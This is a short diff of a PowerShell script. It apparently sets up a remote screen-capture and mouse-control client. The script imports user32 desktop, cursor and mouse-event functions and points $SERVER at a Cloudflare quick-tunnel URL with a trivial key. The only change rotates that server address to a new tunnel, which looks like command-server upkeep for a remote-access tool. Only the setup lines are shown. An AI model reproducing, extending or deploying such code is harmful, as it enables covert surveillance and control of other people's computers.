@@ -1,5 +1,5 @@
 Add-Type -AssemblyName System.Windows.Forms,System.Drawing,System.Net.Http
-$SERVER="https://after-interested-lives-phillips.trycloudflare.com/";$KEY="1234";$PREV_IMG=$null
+$SERVER="https://ruth-everyone-combining-titled.trycloudflare.com/";$KEY="1234";$PREV_IMG=$null
 Add-Type @"
 using System;using System.Runtime.InteropServices;
 public class Win32{[DllImport("user32.dll")]public static extern IntPtr GetDesktopWindow();[DllImport("user32.dll")]public static extern IntPtr GetWindowDC(IntPtr hWnd);[DllImport("user32.dll")]public static extern int ReleaseDC(IntPtr hWnd,IntPtr hDC);[DllImport("user32.dll")]public static extern void mouse_event(uint dwFlags,uint dx,uint dy,uint dwData,UIntPtr dwExtraInfo);[DllImport("user32.dll")]public static extern int GetSystemMetrics(int nIndex);[DllImport("user32.dll")]public static extern bool SetCursorPos(int X,int Y);}
